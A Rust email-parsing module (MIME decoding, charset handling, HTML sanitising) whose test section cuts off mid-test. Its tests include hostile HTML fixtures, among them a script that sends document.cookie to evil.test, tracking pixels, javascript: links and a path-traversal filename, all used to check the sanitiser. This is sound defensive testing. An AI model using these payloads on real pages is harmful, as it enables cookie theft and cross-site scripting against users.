//! MIME decoding and HTML sanitisation for message bodies.
//!
//! Every function here is a pure transformation over owned or borrowed data:
//! no I/O, no network access, no logging. The entry point for POP3-style
//! access is [`parse_message`], which walks an RFC 822 message and returns its
//! decoded text, sanitised HTML and attachments.

use std::borrow::Cow;
use std::collections::HashSet;

use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD};
use base64::Engine as _;
use encoding_rs::{Encoding, WINDOWS_1252};
use quoted_printable::ParseMode;

/// Maximum MIME nesting depth that [`parse_message`] descends into.
const MAX_DEPTH: usize = 20;
/// Maximum number of leaf body parts collected from one message.
const MAX_PARTS: usize = 200;
/// Maximum length, in characters, of a derived snippet and of a filename.
const MAX_SNIPPET_CHARS: usize = 160;
const MAX_FILENAME_CHARS: usize = 255;

/// Decoded text/html bodies of one message, plus attachments.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct ParsedMessage {
    /// The selected `text/plain` body, if any.
    pub text: Option<String>,
    /// The selected and sanitised `text/html` body, if any.
    pub html: Option<String>,
    /// Every other leaf part carried by the message.
    pub attachments: Vec<ParsedAttachment>,
}

/// One non-body leaf part of a message.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParsedAttachment {
    /// Dotted MIME part identifier, e.g. `1.2.1`.
    pub part: String,
    /// Cleaned base filename, when the part declares one.
    pub filename: Option<String>,
    /// Media type of the part, e.g. `application/pdf`.
    pub content_type: String,
    /// Transfer-decoded body bytes.
    pub bytes: Vec<u8>,
}

/// Transfer-decode one body part.
///
/// Handles `base64`, `quoted-printable`, `7bit`, `8bit` and `binary`; any
/// unknown encoding is returned unchanged. Base64 input may contain arbitrary
/// ASCII whitespace and may omit padding. Quoted-printable input is decoded in
/// robust mode, so malformed escapes are passed through instead of failing.
pub fn decode_transfer(encoding: &str, bytes: &[u8]) -> Vec<u8> {
    match encoding.trim().to_ascii_lowercase().as_str() {
        "base64" => decode_base64(bytes).unwrap_or_else(|| bytes.to_vec()),
        "quoted-printable" => {
            quoted_printable::decode(bytes, ParseMode::Robust).unwrap_or_else(|_| bytes.to_vec())
        }
        _ => bytes.to_vec(),
    }
}

/// Bytes to UTF-8, using the declared charset when it is known.
///
/// Unknown or empty charsets fall back to strict UTF-8, then to Windows-1252.
/// Invalid sequences decode lossily either way.
pub fn decode_text(bytes: &[u8], charset: Option<&str>) -> String {
    let label = charset.map(str::trim).unwrap_or("");
    if !label.is_empty() {
        if let Some(encoding) = Encoding::for_label(label.as_bytes()) {
            return encoding.decode(bytes).0.into_owned();
        }
    }
    match std::str::from_utf8(bytes) {
        Ok(text) => text.to_owned(),
        Err(_) => WINDOWS_1252.decode(bytes).0.into_owned(),
    }
}

/// Decode RFC 2047 encoded words (`=?UTF-8?B?...?=`, `=?GB2312?Q?...?=`).
///
/// Text outside encoded words is preserved verbatim. Whitespace between two
/// adjacent encoded words is dropped, as the RFC requires. Malformed words are
/// left untouched.
pub fn decode_encoded_words(value: &str) -> String {
    let bytes = value.as_bytes();
    let mut out = String::with_capacity(value.len());
    let mut cursor = 0;
    let mut copied = 0;

    while cursor + 1 < bytes.len() {
        if bytes[cursor] == b'=' && bytes[cursor + 1] == b'?' {
            if let Some((decoded, end)) = parse_encoded_word(value, cursor) {
                out.push_str(&value[copied..cursor]);
                out.push_str(&decoded);
                cursor = end;
                copied = end;

                // RFC 2047: whitespace separating two encoded words is ignored.
                let mut next = cursor;
                while next < bytes.len() && bytes[next].is_ascii_whitespace() {
                    next += 1;
                }
                if next > cursor && value[next..].starts_with("=?") {
                    cursor = next;
                    copied = next;
                }
                continue;
            }
        }
        cursor += 1;
    }

    out.push_str(&value[copied..]);
    out
}

/// Sanitise untrusted email HTML for a script-disabled webview.
///
/// The result keeps a conservative tag allowlist, strips event handlers and
/// `javascript:` URLs, and rewrites every image reference that is not an
/// inline `cid:` part or a raster data URI to `about:blank`. Remote images
/// therefore never survive as a fetchable URL.
pub fn sanitize_html(html: &str) -> String {
    let tags: HashSet<&str> = ALLOWED_TAGS.iter().copied().collect();
    let schemes: HashSet<&str> = ["http", "https", "mailto", "cid", "data"]
        .into_iter()
        .collect();

    let mut builder = ammonia::Builder::default();
    builder
        .tags(tags)
        .rm_tags(&[
            "script", "style", "iframe", "object", "embed", "form", "input", "button",
        ])
        .link_rel(Some("noopener noreferrer"))
        .url_schemes(schemes)
        .attribute_filter(|element, attribute, value| {
            if attribute.starts_with("on") {
                return None;
            }

            let lower = value.to_ascii_lowercase();
            if lower.contains("url(") || lower.contains("javascript:") {
                return None;
            }

            // `data:` is only ever legitimate as an inline image payload.
            if lower.trim_start().starts_with("data:") && !(element == "img" && attribute == "src")
            {
                return None;
            }

            if element == "img" {
                match attribute {
                    "srcset" => return None,
                    "src" => {
                        let candidate = lower.trim();
                        if candidate.starts_with("cid:") || is_raster_data_uri(candidate) {
                            return Some(Cow::Borrowed(value));
                        }
                        return Some(Cow::Owned("about:blank".to_string()));
                    }
                    _ => {}
                }
            }

            Some(Cow::Borrowed(value))
        });

    builder.clean(html).to_string()
}

/// Plain-text rendering of (already sanitised) HTML, for snippets and search.
///
/// Block elements become newlines, table cells become spaces, tags and
/// comments are removed and common entities are decoded. Runs of spaces and
/// tabs collapse to one space, runs of three or more newlines collapse to two,
/// and the result is trimmed.
pub fn html_to_text(html: &str) -> String {
    let mut out = String::with_capacity(html.len());
    let mut rest = html;

    while !rest.is_empty() {
        let Some(open) = rest.find('<') else {
            push_decoded_text(rest, &mut out);
            break;
        };
        push_decoded_text(&rest[..open], &mut out);

        let after = &rest[open..];
        if after.starts_with("<!--") {
            match after.find("-->") {
                Some(end) => rest = &after[end + 3..],
                None => break,
            }
            continue;
        }

        let Some(close) = after.find('>') else {
            push_decoded_text(after, &mut out);
            break;
        };
        let tag = after[1..close].trim_start_matches('/').trim();
        let name: String = tag
            .chars()
            .take_while(|ch| ch.is_ascii_alphanumeric())
            .map(|ch| ch.to_ascii_lowercase())
            .collect();
        if is_block_tag(&name) {
            out.push('\n');
        } else if name == "td" || name == "th" {
            out.push(' ');
        }
        rest = &after[close + 1..];
    }

    collapse_whitespace(&out)
}

/// First 160 characters of the whitespace-collapsed text.
pub fn snippet(text: &str) -> String {
    let mut out = String::with_capacity(MAX_SNIPPET_CHARS);
    let mut count = 0;

    for word in text.split_whitespace() {
        if count > 0 {
            if count == MAX_SNIPPET_CHARS {
                break;
            }
            out.push(' ');
            count += 1;
        }
        for ch in word.chars() {
            if count == MAX_SNIPPET_CHARS {
                break;
            }
            out.push(ch);
            count += 1;
        }
        if count == MAX_SNIPPET_CHARS {
            break;
        }
    }

    out
}

/// Parse a complete RFC 822 message (used for POP3, where no BODYSTRUCTURE
/// exists).
///
/// Performs a bounded MIME walk: at most 20 levels of nesting and at most 200
/// leaf parts. The selected text part is the last top-level candidate
/// `text/plain` part, the selected HTML part the last candidate `text/html`
/// part, both ignoring parts marked as attachments. When only HTML exists the
/// plain text is derived from it.
pub fn parse_message(raw: &[u8]) -> ParsedMessage {
    let mut leaves = Vec::new();
    walk_part(raw, "1", 1, &mut leaves);

    let plain_index = leaves
        .iter()
        .rposition(|leaf| leaf.content_type == "text/plain" && !leaf.is_attachment());
    let html_index = leaves
        .iter()
        .rposition(|leaf| leaf.content_type == "text/html" && !leaf.is_attachment());

    let text = plain_index.map(|index| {
        let leaf = &leaves[index];
        decode_text(&leaf.bytes, leaf.charset.as_deref())
    });
    let html = html_index.map(|index| {
        let leaf = &leaves[index];
        sanitize_html(&decode_text(&leaf.bytes, leaf.charset.as_deref()))
    });

    let text = match (text, &html) {
        (Some(text), _) => Some(text),
        (None, Some(html)) => Some(html_to_text(html)),
        (None, None) => None,
    };

    let mut attachments = Vec::new();
    for (index, leaf) in leaves.iter().enumerate() {
        if Some(index) == plain_index || Some(index) == html_index {
            continue;
        }
        if !leaf.is_attachment() && leaf.content_id.is_none() {
            continue;
        }
        attachments.push(ParsedAttachment {
            part: leaf.id.clone(),
            filename: leaf.filename.clone(),
            content_type: leaf.content_type.clone(),
            bytes: leaf.bytes.clone(),
        });
    }

    ParsedMessage {
        text,
        html,
        attachments,
    }
}

const ALLOWED_TAGS: &[&str] = &[
    "a",
    "abbr",
    "b",
    "blockquote",
    "br",
    "caption",
    "center",
    "cite",
    "code",
    "col",
    "colgroup",
    "dd",
    "div",
    "dl",
    "dt",
    "em",
    "font",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "hr",
    "i",
    "img",
    "li",
    "ol",
    "p",
    "pre",
    "q",
    "s",
    "small",
    "span",
    "strike",
    "strong",
    "sub",
    "sup",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "tr",
    "u",
    "ul",
];

fn is_raster_data_uri(lower: &str) -> bool {
    const PREFIXES: &[&str] = &[
        "data:image/png",
        "data:image/jpeg",
        "data:image/gif",
        "data:image/webp",
    ];
    PREFIXES.iter().any(|prefix| {
        lower
            .strip_prefix(prefix)
            .is_some_and(|rest| rest.is_empty() || rest.starts_with(';') || rest.starts_with(','))
    })
}

fn is_block_tag(name: &str) -> bool {
    matches!(
        name,
        "p" | "div"
            | "br"
            | "li"
            | "tr"
            | "h1"
            | "h2"
            | "h3"
            | "h4"
            | "h5"
            | "h6"
            | "blockquote"
            | "pre"
    )
}

fn decode_base64(bytes: &[u8]) -> Option<Vec<u8>> {
    let compact: Vec<u8> = bytes
        .iter()
        .copied()
        .filter(|byte| !byte.is_ascii_whitespace())
        .collect();
    if compact.is_empty() {
        return Some(Vec::new());
    }
    for engine in [&STANDARD, &STANDARD_NO_PAD] {
        if let Ok(decoded) = engine.decode(&compact) {
            return Some(decoded);
        }
    }
    None
}

fn parse_encoded_word(value: &str, start: usize) -> Option<(String, usize)> {
    let rest = &value[start..];
    let charset_end = rest[2..].find('?')? + 2;
    let encoding_end = rest[charset_end + 1..].find('?')? + charset_end + 1;
    let word_end = rest[encoding_end + 1..].find("?=")? + encoding_end + 1;

    let charset = &rest[2..charset_end];
    let encoding = &rest[charset_end + 1..encoding_end];
    let data = &rest[encoding_end + 1..word_end];

    let bytes = match encoding {
        "B" | "b" => decode_base64(data.as_bytes())?,
        "Q" | "q" => decode_q_word(data.as_bytes()),
        _ => return None,
    };

    let charset = charset
        .find('*')
        .map_or(charset, |language| &charset[..language])
        .trim();
    let charset = if charset.is_empty() {
        None
    } else {
        Some(charset)
    };

    Some((decode_text(&bytes, charset), start + word_end + 2))
}

fn decode_q_word(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len());
    let mut index = 0;
    while index < data.len() {
        match data[index] {
            b'_' => {
                out.push(b' ');
                index += 1;
            }
            b'=' if index + 2 < data.len() => {
                match (hex_value(data[index + 1]), hex_value(data[index + 2])) {
                    (Some(high), Some(low)) => {
                        out.push(high * 16 + low);
                        index += 3;
                    }
                    _ => {
                        out.push(b'=');
                        index += 1;
                    }
                }
            }
            byte => {
                out.push(byte);
                index += 1;
            }
        }
    }
    out
}

fn hex_value(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        b'A'..=b'F' => Some(byte - b'A' + 10),
        _ => None,
    }
}

fn push_decoded_text(text: &str, out: &mut String) {
    let mut rest = text;
    while let Some(amp) = rest.find('&') {
        out.push_str(&rest[..amp]);
        rest = &rest[amp..];
        match parse_entity(rest) {
            Some((decoded, consumed)) => {
                out.push(decoded);
                rest = &rest[consumed..];
            }
            None => {
                out.push('&');
                rest = &rest[1..];
            }
        }
    }
    out.push_str(rest);
}

fn parse_entity(input: &str) -> Option<(char, usize)> {
    let end = input.find(';')?;
    if end > 12 {
        return None;
    }
    let body = &input[1..end];
    let decoded = match body {
        "amp" => '&',
        "lt" => '<',
        "gt" => '>',
        "quot" => '"',
        "nbsp" => ' ',
        _ => {
            let number = body.strip_prefix('#')?;
            let code = if let Some(hex) = number
                .strip_prefix('x')
                .or_else(|| number.strip_prefix('X'))
            {
                u32::from_str_radix(hex, 16).ok()?
            } else {
                number.parse::<u32>().ok()?
            };
            char::from_u32(code)?
        }
    };
    Some((decoded, end + 1))
}

fn collapse_whitespace(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut pending_space = false;
    let mut newlines = 0usize;

    for ch in input.chars() {
        match ch {
            ' ' | '\t' | '\r' => {
                if !out.is_empty() && !out.ends_with('\n') {
                    pending_space = true;
                }
            }
            '\n' => {
                pending_space = false;
                if newlines < 2 {
                    out.push('\n');
                }
                newlines += 1;
            }
            _ => {
                if pending_space && !out.is_empty() && !out.ends_with('\n') {
                    out.push(' ');
                }
                pending_space = false;
                newlines = 0;
                out.push(ch);
            }
        }
    }

    out.trim_matches(['\n', ' ', '\t']).to_string()
}

struct Leaf {
    id: String,
    content_type: String,
    charset: Option<String>,
    disposition: Option<String>,
    filename: Option<String>,
    content_id: Option<String>,
    bytes: Vec<u8>,
    /// A container that could not be descended into and is kept as a blob.
    forced_attachment: bool,
}

impl Leaf {
    fn is_attachment(&self) -> bool {
        self.forced_attachment
            || self.disposition.as_deref() == Some("attachment")
            || self.filename.is_some()
            || !(self.content_type.starts_with("text/")
                || self.content_type.starts_with("multipart/"))
    }
}

fn walk_part(raw: &[u8], id: &str, depth: usize, leaves: &mut Vec<Leaf>) {
    if leaves.len() >= MAX_PARTS {
        return;
    }

    let (header_block, body) = split_headers_body(raw);
    let headers = parse_headers(header_block);

    let (content_type, params) = parse_structured(header(&headers, "content-type").unwrap_or(""));
    let content_type = if content_type.is_empty() {
        "text/plain".to_string()
    } else {
        content_type
    };
    let encoding = header(&headers, "content-transfer-encoding").unwrap_or("7bit");
    let charset = param(&params, "charset").map(str::to_string);

    let (disposition, disposition_filename) = match header(&headers, "content-disposition") {
        Some(value) => {
            let (kind, disp_params) = parse_structured(value);
            let filename = param(&disp_params, "filename").map(str::to_string);
            let kind = if kind.is_empty() { None } else { Some(kind) };
            (kind, filename)
        }
        None => (None, None),
    };
    let filename = disposition_filename
        .or_else(|| param(&params, "name").map(str::to_string))
        .and_then(|raw| clean_filename(&raw));
    let content_id = header(&headers, "content-id")
        .map(|value| value.trim().trim_matches(['<', '>']).to_string())
        .filter(|value| !value.is_empty());

    if content_type.starts_with("multipart/") && depth < MAX_DEPTH {
        if let Some(boundary) = param(&params, "boundary") {
            let parts = split_multipart(body, boundary);
            if !parts.is_empty() {
                for (index, part) in parts.iter().enumerate() {
                    if leaves.len() >= MAX_PARTS {
                        break;
                    }
                    let child_id = format!("{id}.{}", index + 1);
                    walk_part(part, &child_id, depth + 1, leaves);
                }
                return;
            }
        }
    }

    leaves.push(Leaf {
        id: id.to_string(),
        content_type: content_type.clone(),
        charset,
        disposition,
        filename,
        content_id,
        bytes: decode_transfer(encoding, body),
        forced_attachment: content_type.starts_with("multipart/"),
    });
}

fn split_headers_body(raw: &[u8]) -> (&[u8], &[u8]) {
    let crlf = find_subslice(raw, b"\r\n\r\n").map(|position| (position, 4));
    let lf = find_subslice(raw, b"\n\n").map(|position| (position, 2));
    let split = match (crlf, lf) {
        (Some(crlf), Some(lf)) => Some(if crlf.0 <= lf.0 { crlf } else { lf }),
        (Some(crlf), None) => Some(crlf),
        (None, Some(lf)) => Some(lf),
        (None, None) => None,
    };
    match split {
        Some((position, length)) => (&raw[..position], &raw[position + length..]),
        None => (raw, &[]),
    }
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() {
        return Some(0);
    }
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

fn parse_headers(block: &[u8]) -> Vec<(String, String)> {
    let text = String::from_utf8_lossy(block);
    let mut headers: Vec<(String, String)> = Vec::new();
    let mut current: Option<(String, String)> = None;

    for line in text.split('\n') {
        let line = line.strip_suffix('\r').unwrap_or(line);
        if line.is_empty() {
            continue;
        }
        if line.starts_with(' ') || line.starts_with('\t') {
            if let Some((_, value)) = current.as_mut() {
                let continuation = line.trim();
                if !continuation.is_empty() {
                    if !value.is_empty() && !value.ends_with(' ') {
                        value.push(' ');
                    }
                    value.push_str(continuation);
                }
            }
            continue;
        }
        if let Some(header) = current.take() {
            headers.push(header);
        }
        if let Some((name, value)) = line.split_once(':') {
            current = Some((name.trim().to_ascii_lowercase(), value.trim().to_string()));
        }
    }
    if let Some(header) = current {
        headers.push(header);
    }

    headers
}

fn header<'a>(headers: &'a [(String, String)], name: &str) -> Option<&'a str> {
    headers
        .iter()
        .find(|(key, _)| key == name)
        .map(|(_, value)| value.as_str())
}

fn parse_structured(value: &str) -> (String, Vec<(String, String)>) {
    let mut segments = split_unquoted_semicolons(value).into_iter();
    let head = segments.next().unwrap_or("").trim().to_ascii_lowercase();
    let mut params = Vec::new();
    for segment in segments {
        if let Some((name, raw)) = segment.split_once('=') {
            let name = name.trim().to_ascii_lowercase();
            if !name.is_empty() {
                params.push((name, unquote(raw)));
            }
        }
    }
    (head, params)
}

fn split_unquoted_semicolons(value: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0;
    let mut quoted = false;
    let mut escaped = false;

    for (index, ch) in value.char_indices() {
        if escaped {
            escaped = false;
            continue;
        }
        match ch {
            '\\' if quoted => escaped = true,
            '"' => quoted = !quoted,
            ';' if !quoted => {
                parts.push(&value[start..index]);
                start = index + 1;
            }
            _ => {}
        }
    }
    parts.push(&value[start..]);
    parts
}

fn unquote(raw: &str) -> String {
    let value = raw.trim();
    let inner = if value.len() >= 2 && value.starts_with('"') && value.ends_with('"') {
        &value[1..value.len() - 1]
    } else {
        return value.to_string();
    };

    let mut out = String::with_capacity(inner.len());
    let mut escaped = false;
    for ch in inner.chars() {
        if escaped {
            out.push(ch);
            escaped = false;
        } else if ch == '\\' {
            escaped = true;
        } else {
            out.push(ch);
        }
    }
    if escaped {
        out.push('\\');
    }
    out
}

fn param<'a>(params: &'a [(String, String)], name: &str) -> Option<&'a str> {
    params
        .iter()
        .find(|(key, _)| key == name)
        .map(|(_, value)| value.as_str())
}

fn clean_filename(raw: &str) -> Option<String> {
    let decoded = decode_encoded_words(raw);
    let base = decoded
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(decoded.as_str());

    let mut cleaned = String::with_capacity(base.len());
    for ch in base.chars() {
        if ch == '/' || ch == '\\' || ch.is_control() {
            continue;
        }
        cleaned.push(ch);
    }

    let trimmed = cleaned.trim();
    if trimmed.is_empty() {
        return None;
    }
    Some(trimmed.chars().take(MAX_FILENAME_CHARS).collect())
}

fn split_multipart<'a>(body: &'a [u8], boundary: &str) -> Vec<&'a [u8]> {
    let marker = format!("--{boundary}");
    let closing = format!("--{boundary}--");
    let marker = marker.as_bytes();
    let closing = closing.as_bytes();

    let mut parts = Vec::new();
    let mut current: Option<usize> = None;
    let mut line_start = 0;

    loop {
        let line_end = body[line_start..]
            .iter()
            .position(|byte| *byte == b'\n')
            .map_or(body.len(), |offset| line_start + offset);
        let content_end = if line_end > line_start && body[line_end - 1] == b'\r' {
            line_end - 1
        } else {
            line_end
        };
        let line = trim_ascii_end(&body[line_start..content_end]);
        let is_opening = line == marker;
        let is_closing = line == closing;

        if is_opening || is_closing {
            if let Some(start) = current.take() {
                let part = trim_trailing_newline(&body[start..line_start]);
                if !part.is_empty() {
                    parts.push(part);
                }
            }
            if is_closing {
                break;
            }
            let next = if line_end < body.len() {
                line_end + 1
            } else {
                body.len()
            };
            current = Some(next);
        }

        if line_end >= body.len() {
            break;
        }
        line_start = line_end + 1;
    }

    // A truncated message may end without the closing delimiter.
    if let Some(start) = current {
        let part = trim_trailing_newline(&body[start..]);
        if !part.is_empty() {
            parts.push(part);
        }
    }

    parts
}

fn trim_ascii_end(bytes: &[u8]) -> &[u8] {
    let end = bytes
        .iter()
        .rposition(|byte| !byte.is_ascii_whitespace())
        .map_or(0, |position| position + 1);
    &bytes[..end]
}

fn trim_trailing_newline(bytes: &[u8]) -> &[u8] {
    if bytes.ends_with(b"\r\n") {
        &bytes[..bytes.len() - 2]
    } else if bytes.ends_with(b"\n") {
        &bytes[..bytes.len() - 1]
    } else {
        bytes
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base64_transfer_decode_ignores_whitespace_and_padding() {
        assert_eq!(
            decode_transfer("base64", b"SGVsbG8s\r\nIFdvcmxkIQ=="),
            b"Hello, World!"
        );
        assert_eq!(decode_transfer("BASE64", b"SGVsbG8"), b"Hello");
        assert_eq!(decode_transfer("7bit", b"raw bytes"), b"raw bytes");
        assert_eq!(decode_transfer("8bit", b"raw bytes"), b"raw bytes");
        assert_eq!(decode_transfer("binary", b"raw bytes"), b"raw bytes");
        assert_eq!(decode_transfer("x-unknown", b"raw bytes"), b"raw bytes");
    }

    #[test]
    fn quoted_printable_handles_soft_breaks_and_hex_escapes() {
        let body = b"soft=\r\nbreak and =E4=BD=A0=E5=A5=BD";
        assert_eq!(
            decode_transfer("quoted-printable", body),
            "softbreak and 你好".as_bytes()
        );
        assert_eq!(
            decode_transfer("Quoted-Printable", b"a=3Db"),
            b"a=b".to_vec()
        );
    }

    #[test]
    fn decode_text_honours_gbk_and_gb2312_labels() {
        let bytes = [0xC4u8, 0xE3, 0xBA, 0xC3];
        assert_eq!(decode_text(&bytes, Some("GB2312")), "你好");
        assert_eq!(decode_text(&bytes, Some("gbk")), "你好");
    }

    #[test]
    fn decode_text_falls_back_to_utf8_then_windows_1252() {
        assert_eq!(decode_text("héllo".as_bytes(), None), "héllo");
        assert_eq!(decode_text("héllo".as_bytes(), Some("")), "héllo");
        assert_eq!(decode_text(b"caf\xe9", Some("no-such-charset")), "café");
        assert_eq!(decode_text(b"caf\xe9", None), "café");
    }

    #[test]
    fn encoded_words_mix_b_q_and_plain_ascii() {
        let input = "Hello =?UTF-8?B?5L2g5aW9?= and =?UTF-8?Q?w=C3=B6rld?=!";
        assert_eq!(decode_encoded_words(input), "Hello 你好 and wörld!");
    }

    #[test]
    fn encoded_words_merge_adjacent_words_and_decode_underscore() {
        assert_eq!(
            decode_encoded_words("=?UTF-8?B?5L2g?= =?UTF-8?B?5aW9?="),
            "你好"
        );
        assert_eq!(decode_encoded_words("=?ISO-8859-1?Q?a_b?="), "a b");
        assert_eq!(decode_encoded_words("=?GB2312?B?xOO6ww==?="), "你好");
    }

    #[test]
    fn malformed_encoded_words_are_preserved() {
        let input = "=?UTF-8?X?bad?= and =?UTF-8?B?not-base64!!?=";
        assert_eq!(decode_encoded_words(input), input);
    }

    const ATTACK_CASES: &[&str] = &[
        r#"<p>Hello <b>world</b></p>"#,
        r#"<p>hi</p><script>fetch('http://evil.test/steal?'+document.cookie)</script>"#,
        r#"<img src="http://track.test/pixel.gif" onerror="alert(1)">"#,
        r#"<a href="javascript:alert(1)">click</a>"#,
        r#"<iframe src="http://evil.test"></iframe><form action="http://evil.test"><input name="x"></form>"#,
        r#"<div style="background:url(http://track.test/bg)">x</div>"#,
        r#"<svg><script>alert(1)</script></svg><p>ok</p>"#,
        r#"<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">"#,
        r#"<table><tr><td><img src="https://track.test/open?id=1" width="1" height="1"></td></tr></table>"#,
    ];

    fn has_event_handler(html: &str) -> bool {
        let lower = html.to_ascii_lowercase();
        let bytes = lower.as_bytes();
        for index in 0..bytes.len() {
            if bytes[index] != b'o' {
                continue;
            }
            let mut cursor = index + 1;
            if cursor >= bytes.len() || bytes[cursor] != b'n' {
                continue;
            }
            cursor += 1;
            let name_start = cursor;
            while cursor < bytes.len() && bytes[cursor].is_ascii_alphabetic() {
                cursor += 1;
            }
            if cursor > name_start && cursor < bytes.len() && bytes[cursor] == b'=' {
                return true;
            }
        }
        false
    }

    #[test]
    fn sanitizer_blocks_all_spike_attack_cases() {
        for input in ATTACK_CASES {
            let clean = sanitize_html(input);
            let lower = clean.to_ascii_lowercase();
            assert!(!lower.contains("<script"), "script survived: {clean}");
            assert!(
                !has_event_handler(&clean),
                "event handler survived: {clean}"
            );
            assert!(!lower.contains("javascript:"), "js url survived: {clean}");
            assert!(
                !lower.contains("src=\"http") && !lower.contains("src='http"),
                "remote image survived: {clean}"
            );
            assert!(
                !lower.contains("src=\"/"),
                "relative image survived: {clean}"
            );
            assert!(!lower.contains("url("), "css url survived: {clean}");
            assert!(
                !lower.contains("data:image/svg"),
                "svg data uri survived: {clean}"
            );
        }

        let remote = sanitize_html(r#"<img src="http://track.test/p.gif">"#);
        assert!(remote.contains("about:blank"), "{remote}");
        assert!(!remote.contains("track.test"), "{remote}");
    }

    #[test]
    fn sanitizer_keeps_cid_and_raster_data_images_and_safe_links() {
        let clean = sanitize_html(
            r#"<p><img src="cid:part1.2" alt="inline"><img src="data:image/png;base64,AAAA"></p><a href="https://example.com">x</a><a href="data:text/html,evil">y</a>"#,
        );
        assert!(clean.contains("cid:part1.2"), "{clean}");
        assert!(clean.contains("data:image/png;base64,AAAA"), "{clean}");
        assert!(clean.contains("https://example.com"), "{clean}");
        assert!(clean.contains("noopener noreferrer"), "{clean}");
        assert!(!clean.contains("data:text/html"), "{clean}");
    }

    #[test]
    fn html_to_text_converts_blocks_cells_and_entities() {
        let text = html_to_text(
            "<div>Hello <b>world</b>&nbsp;&amp; friend</div><p>Line&#33;<br>Next &#x1F600;</p>\
             <table><tr><td>a</td><td>b</td></tr></table>",
        );
        assert_eq!(text, "Hello world & friend\n\nLine!\nNext 😀\n\na b");
        assert_eq!(html_to_text("  a\t\t b  \n\n\n\nc  "), "a b\n\nc");
    }

    #[test]
    fn snippet_collapses_whitespace_and_caps_at_160_chars() {
        assert_eq!(snippet("  hello \n\n world  "), "hello world");
        assert_eq!(snippet(""), "");
        let long = "a".repeat(200);
        let short = snippet(&long);
        assert_eq!(short.chars().count(), 160);
        let words = "word ".repeat(100);
        assert_eq!(snippet(&words).chars().count(), 160);
    }

    fn message(raw: &str) -> Vec<u8> {
        raw.replace('\n', "\r\n").into_bytes()
    }

    #[test]
    fn multipart_alternative_selects_text_and_sanitised_html() {
        let raw = message(
            "MIME-Version: 1.0\n\
             Content-Type: multipart/alternative; boundary=\"alt\"\n\
             \n\
             --alt\n\
             Content-Type: text/plain; charset=utf-8\n\
             \n\
             plain body\n\
             --alt\n\
             Content-Type: text/html; charset=utf-8\n\
             Content-Transfer-Encoding: quoted-printable\n\
             \n\
             <p>Hello <b>wor=6Cd</b><script>alert(1)</script></p>\n\
             --alt--\n",
        );
        let parsed = parse_message(&raw);
        assert_eq!(parsed.text.as_deref(), Some("plain body"));
        let html = parsed.html.as_deref().unwrap_or_default();
        assert!(html.contains("<b>world</b>"), "{html}");
        assert!(!html.contains("<script"), "{html}");
        assert!(parsed.attachments.is_empty());
    }

    #[test]
    fn multipart_mixed_reports_attachment_metadata_and_bytes() {
        let raw = message(
            "Content-Type: multipart/mixed; boundary=mix\n\
             \n\
             --mix\n\
             Content-Type: text/plain\n\
             \n\
             hello\n\
             --mix\n\
             Content-Type: application/pdf\n\
             Content-Transfer-Encoding: base64\n\
             Content-Disposition: attachment; filename=\"../../etc/report.pdf\"\n\
             Content-ID: <att-1>\n\
             \n\
             JVBERi0=\n\
             --mix--\n",
        );
        let parsed = parse_message(&raw);
        assert_eq!(parsed.text.as_deref(), Some("hello"));
        assert!(parsed.html.is_none());
        assert_eq!(parsed.attachments.len(), 1);
        let attachment = &parsed.attachments[0];
        assert_eq!(attachment.part, "1.2");
        assert_eq!(attachment.filename.as_deref(), Some("report.pdf"));
        assert_eq!(attachment.content_type, "application/pdf");
        assert_eq!(attachment.bytes, b"%PDF-");
    }

    #[test]
    fn plain_text_only_message_has_no_html() {
        let raw = message("Subject: plain\n\njust text\n");
        let parsed = parse_message(&raw);
        assert_eq!(parsed.text.as_deref().map(str::trim), Some("just text"));
        assert!(parsed.html.is_none());
        assert!(parsed.attachments.is_empty());
    }

    #[test]
    fn html_only_message_derives_plain_text() {
        let raw = message(
            "Content-Type: text/html; charset=utf-8\n\
             \n\
             <p>Hello <b>world</b></p><p>second</p>\n",
        );
        let parsed = parse_message(&raw);
        let html = parsed.html.as_deref().unwrap_or_default();
        assert!(html.contains("<b>world</b>"), "{html}");
        assert_eq!(
            parsed.text.as_deref().map(str::trim),
            Some("Hello world\n\nsecond")
        );
    }

    #[test]
    fn folded_headers_and_nested_multipart_ids_are_correct() {
        let raw = message(
            "Content-Type: multipart/mixed;\n\
             \tboundary=\"outer\"\n\
             \n\
             --outer\n\
             Content-Type: multipart/alternative;\n\
             \tboundary=\"inner\"\n\
             \n\
             --inner\n\
             Content-Type: text/plain; charset=utf-8\n\
             \n\
             plain\n\
             --inner\n\
             Content-Type: text/html; charset=utf-8\n\
             \n\
             <b>rich</b>\n\
             --inner--\n\
             --outer\n\
             Content-Type: image/png\n\
             Content-Transfer-Encoding: base64\n\
             Content-Disposition: attachment;\n\
             \tfilename=\"=?UTF-8?B?5Zu+54mHLnBuZw==?=\"\n\
             \n\
             AAEC\n\
             --outer--\n",
        );
        let parsed = parse_message(&raw);
        assert_eq!(parsed.text.as_deref(), Some("plain"));
        assert!(parsed
            .html
            .as_deref()
            .unwrap_or_default()
            .contains("<b>rich</b>"));
        assert_eq!(parsed.attachments.len(), 1);
        let attachment = &parsed.attachments[0];
        assert_eq!(attachment.part, "1.2");
        assert_eq!(attachment.filename.as_deref(), Some("图片.png"));
        assert_eq!(attachment.content_type, "image/png");
        assert_eq!(attachment.bytes, [0u8, 1, 2]);
    }

    #[test]
    fn message_rfc822_is_an_attachment_and_is_not_descended_into() {
        let raw = message(
            "Content-Type: multipart/mixed; boundary=m\n\
             \n\
             --m\n\
             Content-Type: text/plain\n\
             \n\
             outer\n\
             --m\n\
             Content-Type: message/rfc822\n\
             \n\
